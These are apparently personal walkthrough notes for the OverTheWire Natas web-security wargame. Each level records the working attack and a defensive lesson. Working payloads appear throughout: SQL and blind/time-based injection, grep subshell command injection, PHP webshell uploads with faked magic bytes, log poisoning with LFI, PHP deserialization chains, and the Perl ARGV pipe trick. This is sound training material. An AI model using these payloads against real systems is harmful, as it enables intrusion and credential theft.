## Natas 0 

**Challenge:** Find the password hidden in the page source.

**What I tried first:** Opened inspect element to look at the HTML directly.

**What worked:** The password was sitting in a comment in the page source  plain text, no tricks.

**Why it worked:** The server sends the full HTML to your browser before rendering it. 
Developers sometimes leave sensitive data in comments thinking users won't look. 
Inspect element just reads what was already delivered to you.

**New concept:** Always check page source on web challenges. 
Client-side code is never truly hidden  the browser has to receive it to render it.

---

## Natas 0 → 1

**Challenge:** Find the password hidden in the page source  but right-click is blocked.

**What I tried first:** Tried to open inspect element via right-click like level 0. 
Got blocked  the page disables the context menu with JavaScript.

**What worked:** Used Ctrl+Shift+C to open devtools directly. 
Password was sitting in the HTML source as a comment, same as level 0.

**Why it worked:** Right-click blocking is pure JavaScript  it prevents the context 
menu from appearing, not the browser's built-in dev tools. Native browser shortcuts 
bypass client-side restrictions entirely. The server already sent the full HTML to 
your browser before any JavaScript ran  nothing can take it back.

**New concept:** Client-side restrictions are cosmetic. JavaScript can hide buttons, 
block menus, and disable interactions  but it cannot hide data that was already 
delivered to the browser. Ctrl+Shift+C, Ctrl+U (view source), and F12 always work.

---

## Natas 1 → 2

**Challenge:** Find the password  nothing visible in the page source.

**What I tried first:** Checked the full page source and all linked files including CSS. 
Nothing obvious. Then noticed the HTML was loading an image from a folder called /files/.

**What worked:** Navigated directly to:
http://natas2.natas.labs.overthewire.org/files/
Found a file called users.txt sitting there openly. Password was inside.

**Why it worked:** The HTML only referenced the image but the entire /files/ directory 
was publicly accessible with no index protection. The server listed everything in it.

**New concept:** Directory listing  if a web server has no index file in a folder and 
listing isn't disabled, anyone can browse it like a file manager. Always check folders 
referenced in source code, not just the files themselves.

---

## Natas 2 → 3

**Challenge:** "Not even Google will find this"  find the hidden content.

**What I tried first:** Took the hint literally and checked robots.txt  the file websites 
use to tell search engines what not to crawl. Found /s3cr3t/ listed as disallowed.

**What worked:** Navigated directly to:
http://natas3.natas.labs.overthewire.org/s3cr3t/
Found users.txt inside. Password was there.

**Why it worked:** robots.txt is public by design  it has to be readable by crawlers. 
Hiding a directory in robots.txt doesn't protect it, it literally advertises it.

**New concept:** robots.txt is a roadmap for attackers. "Disallow" means 
"don't index this" not "block access to this." Always check /robots.txt early 
in any web recon.
---
## Natas 3 → 4

**Challenge:** Page says "Access disallowed"  only users coming from natas5 are authorized. 

**What I tried first:** Installed ModHeader extension to fake the Referer header in the browser. Couldn't get it to work properly.

**What worked:** ```bash curl -u natas4:PASSWORD -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/index.php ``` Password was in the HTML response. 

**Why it worked:** The server checks the Referer header to see where you're coming from. Referer is just a header the client sends  completely controllable. Curl lets you set any header manually, so you can lie to the server about where you came from.

**New concept:** Never trust client-supplied headers for access control. Referer, User-Agent, X-Forwarded-For  all of them can be faked trivially. If a server grants access based on Referer alone, it has zero real security.

---
## Natas 4 → 5

**Challenge:** Page says you're not logged in access denied.

**What I tried first:** Checked the page source and HTML like previous levels. 
Nothing useful.

**What worked:** Opened DevTools → Application → Cookies. Found a cookie called 
`loggedin` with value `0`. Double clicked it, changed it to `1`, refreshed. 
Access granted.

**Why it worked:** The server was trusting a client-side cookie to determine 
login state. Cookies are stored in the browser and fully editable by the user  basing access control on them without server-side validation is a critical flaw.

**New concept:** Never trust cookies for authentication without server-side 
verification. A cookie saying "loggedin=1" means nothing if the server doesn't 
independently verify the session.

---

## Natas 5 → 6

**Challenge:** Enter a secret code to get the password.

**What I tried first:** Looked through DevTools for anything obvious.

**What worked:** Viewed page source and found the PHP function that validates 
the submitted code. It was including a file called `includes/secret.inc` navigated to it directly in the browser and found the secret in plaintext.

**Why it worked:** The include file was publicly accessible with no access restrictions. The developer referenced it in client-visible code, which advertised its location.

**New concept:** Included files containing sensitive data must be protected 
from direct browser access. If a `.inc` or config file is inside the web root 
with no restrictions, anyone can read it.

---

## Natas 6 → 7

**Challenge:** Page only has Home and About links  nothing else visible.

**What I tried first:** Checked DevTools and page source.

**What worked:** Noticed the URL pattern: `index.php?page=home` and 
`index.php?page=about`. The `page` parameter controls what file gets loaded. 
Changed it to the password file path directly:
`index.php?page=/etc/natas_webpass/natas8`
Got the password.

**Why it worked:** The server was passing the `page` parameter directly to a 
file include function with no validation. This is a Local File Inclusion (LFI) 
vulnerability  you can read any file on the server the web process has access to.

**New concept:** LFI (Local File Inclusion)  never pass user input directly 
into file loading functions. Always whitelist allowed values. This is in the 
OWASP Top 10 for a reason.

---

## Natas 7 → 8

**Challenge:** Find the secret key  but it's encoded.

**What I tried first:** Tried to decode it manually, got confused by the 
layered encoding.

**What worked:** Used CyberChef (gchq.github.io/CyberChef) to reverse the 
encoding chain: From Hex → Reverse → From Base64. Got the plaintext secret.

**Why it worked:** The encoding was reversible  it was obfuscation, not 
encryption. Anyone who reads the source code can see the encoding function 
and reverse it step by step.

**New concept:** Encoding ≠ Encryption. Base64, hex, and string reversal 
are trivially reversible. Never store or transmit secrets using encoding alone. 
Use proper cryptographic hashing (bcrypt, argon2) for secrets.
---
## Natas 8 → 9

**Challenge:** Search input passed directly to grep with no sanitization.

**What I tried first:** Normal input, got dictionary results, nothing useful.

**What worked:** Injected a file path using `.` as the grep pattern:
`. /etc/natas_webpass/natas9`
Got the password back in the output.

**Why it worked:** The server runs passthru("grep -i $key dictionary.txt") with no input validation. Injecting a filename adds it as a second argument to grep. The `.` matches every line so it prints the entire file.

**New concept:** Command injection via argument manipulation. You don't need shell operators, sometimes just injecting extra arguments into a legitimate command is enough to read arbitrary files. 

---
## Natas 9 → 10

**Challenge:** Same grep injection but special characters filtered.

**What I tried first:** Tried ; and | , both blocked.

**What worked:** Same technique as level 8, argument injection with `.`:
`. /etc/natas_webpass/natas10`
No special characters needed, filter didn't stop it.

**Why it worked:** The filter only blocked command chaining characters. The root vulnerability, raw user input inside a shell command, was never fixed. Patching symptoms instead of the cause.

**New concept:** Incomplete fixes are worse than no fix, they give false confidence. The real solution is never concatenating user input into shell commands. Use whitelisting or avoid shell execution entirely.

---
## Natas 10 → 11

**Challenge:** Cookies are XOR encrypted. Need to change showpassword from "no" to "yes" without knowing the key.

**What I tried first:** Threw the cookie straight into CyberChef and tried XOR decode. Got garbage because XOR needs a key, you can't reverse it blind.

**What worked:** Three steps:

Step 1 - Find the key.
XOR has a property: if you know the plaintext AND the ciphertext, you can recover the key.
plaintext XOR ciphertext = key
The page source revealed the default data before encryption:
{"showpassword":"no","bgcolor":"#ffffff"}
That is the plaintext. The cookie in the browser is the ciphertext (base64 decode it first).
So in CyberChef: From Base64, then XOR with the known plaintext in UTF8 mode.
Output was eDWoeDWoeDWoeDWo repeating, so the key is eDWo.

Step 2 - Forge a new cookie.
Build the payload you want: {"showpassword":"yes","bgcolor":"#ffffff"}
XOR it with key eDWo in UTF8 mode, then Base64 encode the result.
That is your forged cookie.

Step 3 - Inject it.
DevTools, Application, Cookies, replace the data value with your forged cookie, refresh.
Password appears.

**Why it worked:** XOR encryption is symmetric and key-reusing. If the key is short and repeating, and you know any plaintext, you can always recover the key. The developer encrypted the cookie but left the default plaintext visible in the source code, which handed us everything we needed.

**How to do it again without help:**
1. See encrypted cookie, check page source for how it is built
2. Find what the default plaintext looks like before encryption
3. CyberChef: decode cookie, XOR against known plaintext, spot the repeating key
4. Build your malicious payload, XOR with recovered key, encode, inject

**New concept:** XOR encryption is only as strong as its key secrecy. If the key repeats and you have any known plaintext, the encryption is completely broken. This is why modern systems use AES and never reuse keys.

---
## Natas 11 → 12

**Challenge:** Upload a file  server accepts any file but renames it randomly.

**What I tried first:** Uploaded a PHP shell directly. Server accepted it but saved it as .jpg because of the hidden filename input.

**What worked:** Inspected the page source, found the hidden input field with a .jpg filename. Changed it to .php in DevTools before submitting. Server kept the .php extension and executed the file when navigated to.

**Why it worked:** The server takes the extension from a hidden form input the client controls — not from the actual file. No server-side validation of file type at all.

**New concept:** Never trust client-supplied file metadata. Extension must be validated server-side, not taken from user input.

---

## Natas 12 → 13

**Challenge:** Same file upload but now server checks if the file is actually an image.

**What I tried first:** Same trick as level 11  changed the extension. Got blocked, server now checks file content.

**What worked:** Prepended real JPEG magic bytes to the PHP shell using Python:
python3 -c "with open('shell.php','wb') as f: f.write(b'\xff\xd8\xff\xe0'); f.write(b'<?php echo file_get_contents(\"/etc/natas_webpass/natas14\"); ?>')"
Changed hidden input to .php, uploaded, navigated to file — password printed.

**Why it worked:** Server checks magic bytes to identify file type. Prepending JPEG bytes fools the check while the PHP code still executes.

**New concept:** Magic byte checking alone is not enough. Real defense requires checking bytes, extension, MIME type, and storing uploads outside the web root.

---
## Natas 14 → 15

**Challenge:** Login form backed by MySQL. Need to bypass authentication.

**What I tried first:** Checked source code and cookies. Tried default credentials like admin/admin, admin/password. Nothing worked.

**What worked:** SQL injection in the username field:
" OR "1"="1
Left password field empty. Gained access and got the password.

**Why it worked:** The server builds the SQL query by concatenating user input directly:
SELECT * FROM users WHERE username="INPUT" AND password="INPUT"
Injecting " OR 1=1# closes the username string and adds a condition that is always true, so the query returns results regardless of credentials.

**New concept:** SQL injection   never concatenate user input into SQL queries. Always use prepared statements with parameterized queries.
## Natas 15 → 16

**Challenge:** Input field that checks if a username exists in MySQL. No password shown, just "exists" or "doesn't exist."

**What I tried first:** Checked source code and cookies. Tried default usernames. Confused about how to extract the password with just a yes/no response.

**What worked:** Blind SQL injection. The query is built by concatenating user input directly, so I injected conditions into the username field:
natas16" AND password LIKE "a%" #
This asks the database: does natas16 exist AND does the password start with "a"?
If yes  user exists. If no  try next character.
Repeated character by character until I had the full password. Then automated it with a Python requests script to brute force all 32 characters.

**Why it worked:** The server never sanitizes input before putting it in the SQL query. The LIKE operator with % wildcard lets you test one character at a time. The yes/no response leaks enough information to reconstruct the full password  this is called blind SQL injection because you never see the data directly.

**New concept:** Blind SQLi  you don't need to see query output to extract data. A boolean response (true/false, exists/not exists) is enough to extract anything from the database character by character. This is why even "read-only" query endpoints are dangerous if input isn't sanitized. Real fix: prepared statements, parameterized queries, never string concatenation.
**Script used :** [[Natas15.py]]

---
## Natas 16 → 17

**Challenge:** Search input passed to grep  but now special characters are filtered. Blocks ; | & ` ' "

**What I tried first:** Checked source code. Tried previous injection techniques  all blocked by the filter.

**What worked:** Noticed $ and () are not filtered. Used a subshell injection:
$(grep a /etc/natas_webpass/natas17)
The subshell runs first  if the character exists in the password, grep returns the password string, which gets passed to the outer grep and finds no dictionary match  empty output. If the character doesn't exist, subshell returns nothing, outer grep runs normally and returns dictionary words.

Empty output = character exists in password.
Words showing = character doesn't exist.

Wrote a Python script in two steps:
Step 1 : find which characters exist in the password using the empty/words detection.
Step 2 : build the password character by character using ^ to anchor the start:
$(grep ^ab /etc/natas_webpass/natas17)
This checks if the password starts with "ab". Keep adding characters until all 32 are found.

**Why it worked:** The filter blocks command chaining characters but misses $ and (). The subshell executes before the outer grep, making the output of the inner command influence the outer one. The boolean difference in output (empty vs words) leaks one bit of information per request  enough to extract the full password.

**New concept:** Blind command injection via subshell. Same principle as blind SQLi  you don't need direct output, just a detectable difference in behavior. Always filter $ and () in addition to ; | & when blocking shell injection.

**Script used :** [[scripts/natas16.py]]


---
## Natas 17 → 18 
**Challenge:** Same as level 15  check if username exists in MySQL  but this time no output at all. Page returns nothing regardless of what you inject. 
**What I tried first:** Tried boolean injection like level 15. No difference in output  page always blank. Checked source code, no boolean response anywhere.
**What worked:** Researched different SQL injection techniques and found time-based blind SQLi using MySQL SLEEP(). The idea: if the condition is true, make the server sleep  if false, respond instantly. Measured response time instead of output content. Injection: natas18" AND IF(BINARY password LIKE "a%", SLEEP(3), 0) -- Wrote a Python script using time.time() before and after each request. If elapsed time >= 3 seconds, the character is correct. Built the password character by character the same way as level 15. 
**Why it worked:** Even with zero output, the server's response time leaks information. A 3 second delay = true condition = correct character. Instant response = false = wrong character. Time is a side channel  the server doesn't show you data but its behavior still reveals it. 
**New concept:** Time-based blind SQL injection. When there is no output and no boolean difference, time becomes the oracle. SLEEP() is the MySQL function, pg_sleep() for PostgreSQL, waitfor delay for MSSQL. Any blind SQLi can be converted to time-based when other channels are closed. 
**Script used:** [[scripts/natas17.py]]

## Natas 18 → 19

**Challenge:** Admin session exists somewhere — session ID is a random number between 1 and 640.

**What I tried first:** Checked source code. Found createID generates random number 1-640. isValidAdminLogin always returns 0 so no way to login as admin normally.

**What worked:** Brute forced all 640 session IDs using a Python script. Set PHPSESSID cookie to each number and checked if response contained "You are an admin."

**Why it worked:** The admin session is stored server-side. The only thing identifying it is a predictable numeric ID with a small range. Trying all 640 possibilities is trivial.

**New concept:** Insecure session ID generation. Session IDs must be unpredictable and have a large enough space that brute force is impossible. Using rand(1, 640) is equivalent to no security at all.

**Script used:** [[scripts/natas18.py]]

---

## Natas 19 → 20

**Challenge:** Same as level 18 but session IDs are no longer sequential numbers — they're hex encoded strings.

**What I tried first:** Decoded the cookie value from hex. Got something like 568-natas21. Realized the format is number-username encoded as hex.

**What worked:** Generated all combinations 1-640 as "x-admin", hex encoded each one, set as PHPSESSID cookie and checked for admin response.

**Why it worked:** Same vulnerability as level 18 — predictable session ID. Just added one layer of encoding that doesn't add real security. Encoding is not encryption.

**New concept:** Security through obscurity fails. Hex encoding a weak session ID doesn't make it strong. The ID space is still only 640 possibilities.

**Script used:** [[scripts/natas19.py]]

---

## Natas 20 → 21

**Challenge:** Custom session handler reads and writes session data to a file as key-value pairs separated by newlines.

**What I tried first:** Read the source code. Followed the data flow from input to file to session. Noticed mywrite saves name field directly to file, myread parses every line.

**What worked:** Injected a newline into the name field using %0a:
name=myname%0aadmin 1
Server writes two lines to the session file. myread parses both and sets admin=1.

**Why it worked:** The name input is never sanitized for newline characters. The file parser trusts every line equally so injected lines become real session keys.

**New concept:** Session file injection via newline. Any time user input gets written to a file that is later parsed line by line, newline injection can add arbitrary data. Always strip or escape newlines from user input before writing to files.

---

## Natas 21 → 22

**Challenge:** Two sites share the same session. Experimenter site has a CSS form that saves all POST parameters directly to the session.

**What I tried first:** Read the source code on the experimenter. Found foreach($_REQUEST as $key => $val) saves every parameter without filtering.

**What worked:** Sent admin=1 directly as a URL parameter to the experimenter:
http://natas21-experimenter.natas.labs.overthewire.org/index.php?submit=1&admin=1
Then visited the main natas21 site with the same session cookie  page showed admin credentials.

**Why it worked:** The experimenter blindly saves all request parameters to the session. No whitelist check on what keys are allowed. The shared session between both sites means setting admin=1 on one affects the other.

**New concept:** Mass assignment vulnerability. Never save all request parameters directly to session or database. Always whitelist which keys are allowed.

---

## Natas 22 → 23

**Challenge:** Password visible only with ?revelio parameter but non-admins get redirected with header("Location: /").

**What I tried first:** Added ?revelio to URL  got redirected instantly, saw nothing.

**What worked:** Used curl without -L flag:
curl -u natas22:PASSWORD "http://natas22.natas.labs.overthewire.org/?revelio"
Got the raw response before the redirect  password was in the HTML.

**Why it worked:** header("Location: /") tells the browser to redirect but PHP continues executing the rest of the script. The password HTML is generated and sent in the same response. Browser follows the redirect and never shows it  curl doesn't follow redirects by default so it shows the raw response.

**New concept:** Always use exit after header() redirects in security-sensitive code. Without exit the code below still executes and gets sent to the client even though the browser redirects away.

---

## Natas 23 → 24

**Challenge:** Login form  need the right password to get credentials.

**What I tried first:** Checked source code. Found two conditions joined by &&:
1. strstr checks if "iloveyou" is in the password
2. Password must be greater than 10 numerically

**What worked:** Submitted `11iloveyou`  contains "iloveyou" and PHP casts it to 11 which is > 10.

**Why it worked:** PHP type juggling. When you compare a string to a number with >, PHP converts the string to a number by reading the digits at the start. So "11iloveyou" becomes 11 numerically. Both conditions pass simultaneously.

**New concept:** PHP type juggling — PHP silently converts between types during comparisons. A string starting with a number gets cast to that number. Always use strict comparison === instead of == or > when comparing sensitive values.

---

## Natas 24 → 25

**Challenge:** strcmp checks if submitted password matches the secret.

**What I tried first:** Tried common passwords. Read the source  strcmp returns 0 if strings match, condition uses ! to invert so 0 = true = access granted.

**What worked:** Passed an array instead of a string using square brackets in the URL:
http://natas24.natas.labs.overthewire.org/?passwd[]=anything
strcmp received an array, returned NULL, !NULL = true, condition passed.

**Why it worked:** strcmp was not designed to handle arrays. When it receives one it returns NULL instead of a number. In PHP !NULL evaluates to true so the if block executes without knowing the real password.

**New concept:** PHP strcmp array bypass. Type confusion vulnerability  functions behave unexpectedly when given the wrong data type. Always validate input type before passing to comparison functions. Use === for strict comparison.

---

## Natas 25 → 26

**Challenge:** Page includes language files via lang parameter. safeinclude blocks ../ traversal and blocks any path containing natas_webpass. Can't read the password file directly.

**What I tried first:** Tried direct path traversal with ../. Blocked. Tried including natas_webpass path directly. Blocked by second check.

**What worked:** Two step attack:

Step 1 — inject PHP code into the log file via User-Agent header.
The logRequest function reads $_SERVER['HTTP_USER_AGENT'] and writes it directly to a log file without sanitizing. Used curl to send a request with PHP code as the User-Agent:
curl -H 'User-Agent: <?php echo file_get_contents("/etc/natas_webpass/natas26"); ?>'
This wrote the PHP code into the log file at:
/var/www/natas/natas25/logs/natas25_SESSIONID.log

Step 2 — include the log file via lang parameter.
The log file path contains no natas_webpass so it passes the filter. Used ....// to bypass the ../ removal filter — the filter removes ../ from ....// leaving ../ so traversal still works:
?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_SESSIONID.log
PHP included the log file, executed the injected code, and printed the password where the User-Agent string normally appears in the log.

**Why it worked:** Three vulnerabilities chained together:
1. ....// bypasses the ../ filter because removing ../ from ....// still leaves ../
2. User-Agent header written to log without sanitization  HTTP header injection
3. Log file included as PHP  stored code execution

The log file was the middle man. It stored PHP code without triggering the natas_webpass block, then including it executed the code which read the password directly.

**New concept:** HTTP header injection + chained vulnerabilities. HTTP requests contain headers beyond just URLs and form data  User-Agent, Referer, Cookie, X-Forwarded-For. Any header the server reads and uses without sanitizing is an injection point. This level also shows that real attacks often chain multiple small vulnerabilities together  none of them alone would work, but combined they break the whole system.

**Script used:** curl with custom User-Agent header

---

## Natas 26 → 27

**Challenge:** Page draws lines on an image using coordinates. Drawing data stored in a cookie as serialized PHP object encoded in base64.

**What I tried first:** Checked source code. Found the drawing cookie is unserialized directly with no validation. Noticed the Logger class has a __destruct method that writes exitMsg to a file.

**What worked:** PHP object injection via unserialize. Created a malicious Logger object with:
- logFile = /var/www/natas/natas26/img/shell3.php
- exitMsg = PHP code to read the password

Serialized and base64 encoded it using a local PHP script, set it as the drawing cookie. When the server unserializes it, __destruct runs at the end of the request and writes the PHP shell to the img folder. Visited the shell file  password printed.

Used \x3C and \x3E to encode the PHP tags so the local script didn't interpret them.

**Why it worked:** unserialize() with user controlled input is critical. PHP magic methods like __destruct and __wakeup execute automatically attacker controls what they do by controlling the object properties.

**New concept:** PHP object injection / insecure deserialization. OWASP Top 10. Never deserialize user controlled data. Magic methods become attack vectors when objects are injected.

---

## Natas 27 → 28

**Challenge:** Login and register system backed by MySQL. Need to get natas28 credentials from the database.

**What I tried first:** Tried SQL injection  input is sanitized. Checked how registration and login work. Found username is limited to 64 characters and MySQL ignores trailing spaces in string comparisons.

**What worked:** Username truncation attack.
Registered username: natas28 + 57 spaces + A (65 chars total)
The 64 char limit truncates it to: natas28 + 57 spaces
Existence check didn't find this as a duplicate of natas28 so registration succeeded with my own password.
On login with username natas28 MySQL matched both the real natas28 and my padded version due to trailing space ignoring. Returned the real natas28 row first with the real password.

**Why it worked:** Two different behaviors in the same system  existence check used exact match, login used MySQL string comparison which ignores trailing spaces. The gap between the two allowed creating a colliding username that bypassed the duplicate check but matched the real user on login.

**New concept:** MySQL trailing space collision. STRCMP and LIKE ignore trailing spaces by default. Username length limits combined with this behavior allow creating usernames that collide with existing ones. Always normalize and trim usernames before storing and comparing.

---

# Natas 31 → 32

## Challenge

Perl CGI app that accepts a CSV file upload and renders it as an HTML table. The code uses `$cgi->upload('file')` to check for an upload, then `$cgi->param('file')` to get the file handle, then reads it with the diamond operator `<$file>`.

## What I tried first

Tried injecting a shell command via the filename field in the multipart upload  `filename="| cat /etc/natas_webpass/natas32 |"`. This is the classic Perl `open()` two-argument injection, but it didn't work here because the code never calls `open()` directly on the filename. The CGI module handles the file differently.

Also tried putting the command in the URL query string directly. No output.

## What worked

The **Perl Jam 2** ARGV trick (Netanel Rubin, Black Hat Asia 2016):

1. Send the `file` parameter **twice** in the multipart body  first part has no filename, just the plain string value `ARGV`. Second part is a real file upload to pass the `$cgi->upload('file')` check.
2. Put the command in the **URL query string** with a trailing pipe: `POST /index.pl?/bin/cat%20/etc/natas_webpass/natas32%20|`

```
------HACK
Content-Disposition: form-data; name="file"

ARGV
------HACK
Content-Disposition: form-data; name="file"; filename="legit.csv"
Content-Type: text/csv

a,b,c
------HACK
```

## Why it worked

- `$cgi->upload('file')` checks the second `file` part (real upload) → returns true → passes the if-check
- `$cgi->param('file')` returns the **first** value → the string `"ARGV"`
- In Perl, `<ARGV>` is a magic filehandle — it reads from `@ARGV` (command line arguments)
- In CGI context, `@ARGV` is populated from the **URL query string**
- The trailing `|` in the query string tells Perl to execute it as a shell pipe
- The while loop reads the command output line by line and prints each line into a `<td>` → password appears in the table

## New concept

**The Perl Jam 2 vulnerability**  CGI `param()` + diamond operator `<$file>` attack chain. When `$file` equals the magic string `ARGV`, Perl reads from command line args instead of a file. In CGI, those args come from the URL query string. A trailing `|` triggers shell execution. This is completely different from the classic `open()` filename injection  it only works with this specific combination of `param()` and `<>`.

Reference: The Perl Jam 2  Netanel Rubin, CCC/Black Hat 2016.

---
# Natas 32 → 33

## Challenge

Identical to Natas 31  same Perl CGI app with the ARGV vulnerability. But this time the password file is not directly readable. There is a **setuid binary** in the webroot that must be executed to retrieve the password.

## What is a setuid binary

Normally a program runs with the privileges of the user who executes it. A setuid binary runs with the privileges of its **owner** instead. So a binary owned by `natas33` with the setuid bit set (`-rwsr-x---`) runs as natas33 even when executed by natas32 — giving it access to natas33's password file.

## What I tried first

Same ARGV trick from natas31 but the command encoding caused issues  empty responses. Tried `ls+-la+.+|` and `ls%20-la%20.%20|` before finding the right encoding.

## What worked

Same ARGV technique as natas31, but with two steps:

**Step 1 — find the binary:**

```
POST /index.pl?ls -la . | HTTP/1.1
```

With the ARGV multipart body. This listed the webroot and revealed the setuid binary (identified by the `s` in permissions: `-rwsr-x---`).

**Step 2 — execute it:**

```
POST /index.pl?./getpassword | HTTP/1.1
```

The binary ran as natas33 (due to setuid) and printed the password into the table output.

## Why it worked

Same ARGV + URL query string pipe mechanism as natas31. The key addition here is understanding Linux file permissions  the `s` in the execute bit position means setuid. The binary acts as a privilege escalation bridge: natas32 runs it, it executes as natas33, reads the password file natas32 couldn't access directly.

## New concept

**Setuid binaries as privilege escalation**  a file permission concept where a program runs as its owner rather than the executor. Common pattern in CTFs and real-world privesc: find a setuid binary owned by a higher-privileged user and either execute it directly or exploit it. Always check `ls -la` or `find / -perm -4000` when doing recon.

---
# Natas 33 → 34 (Final Level)

## Challenge

PHP file upload app. An `Executor` class with three private properties: `$filename` (from POST), `$signature` (hardcoded MD5 string), and `$init`. The `__destruct()` method runs at script shutdown  it does `chdir("/natas33/upload/")`, then checks `md5_file($this->filename) == $this->signature`, and if they match runs `passthru("php " . $this->filename)`. Direct password file read is blocked by permissions.

## What I tried first

Tried to craft a file whose MD5 naturally matched the hardcoded signature — not feasible (MD5 preimage attack is computationally impossible in practice).

## What worked

**PHP object injection via session deserialization**  a chain of three techniques:

### Step 1 — Upload the shell

Created `natas33.php`:

```php
<?php passthru("cat /etc/natas_webpass/natas34"); ?>
```

Computed its MD5: `md5sum natas33.php` → `46c3a67cdfb0f3226b7327a8fd10ed3f`

Uploaded it with `filename` POST param set to `natas33.php` so the server saved it at `/natas33/upload/natas33.php`.

### Step 2 — Craft the serialized Executor object

Wrote a local PHP script:

```php
<?php
class Executor {
    private $filename = "natas33.php";
    private $signature = "46c3a67cdfb0f3226b7327a8fd10ed3f";
    private $init = False;
}
$obj = new Executor();
echo serialize($obj);
?>
```

Ran `php natas33ex.php > session_payload.bin`  piped to a binary file to preserve null bytes in the serialized private property names.

**Important:** PHP serializes private properties with null bytes around the class name (`\x00ClassName\x00propertyname`). Copy-pasting the output destroys these null bytes and breaks deserialization. Always pipe to a file and use "Paste from file" in Burp.

### Step 3 — Drop the session file via path traversal

PHP session files live at `/var/lib/php/sessions/sess_PHPSESSID`. The upload stores files at `/natas33/upload/` + `$filename` where `$filename` comes from the POST parameter  no sanitization. Used path traversal in the `filename` POST field:

```
filename = ../../var/lib/php/sessions/sess_abc123
```

Uploaded `session_payload.bin` as the file content (with `x|` prefix for PHP session format). Server confirmed:

```
The update has been uploaded to: /natas33/upload/../../var/lib/php/sessions/sess_abc123
```

### Step 4 — Trigger deserialization

Sent a GET request with `Cookie: PHPSESSID=abc123`. PHP called `session_start()`, found the session file, deserialized the `Executor` object. At script shutdown `__destruct()` fired:

- `chdir("/natas33/upload/")`
- `md5_file("natas33.php")` → matched the signature
- `passthru("php natas33.php")` → executed the shell → printed the password

## Why it worked

Four vulnerabilities chained together:

1. **Unsanitized `filename` POST param** fed to `move_uploaded_file()` → path traversal to write anywhere
2. **PHP object injection**  `session_start()` deserializes whatever is in the session file, calling `__destruct()` on any objects found
3. **Hardcoded `$signature`**  attacker can set their own `$signature` in the serialized object to match their own file's MD5 instead of guessing the original
4. **`passthru()` in `__destruct()`**  arbitrary code execution once the MD5 check passes

## New concepts

**PHP object injection / insecure deserialization**  PHP automatically deserializes session files on `session_start()`. If an attacker controls the session file content and the codebase has a class with a dangerous magic method (`__destruct`, `__wakeup`, `__toString`), they can trigger arbitrary code execution. This is OWASP Top 10 A08:2021.

**PHP magic methods**  special methods that PHP calls automatically in certain situations:

- `__construct()`  on `new ClassName()`
- `__destruct()`  at end of script or when object is garbage collected
- `__wakeup()`  on `unserialize()`
- `__toString()`  when object used as string

**Null bytes in PHP serialization**  private and protected properties include null bytes in their serialized names. These are invisible in terminals and get stripped by copy-paste. Always work with binary files when dealing with serialized PHP objects.

**Path traversal in file upload destinations**  when `move_uploaded_file()` uses unsanitized user input for the destination path, `../../` sequences let an attacker write files anywhere the web server has permission.
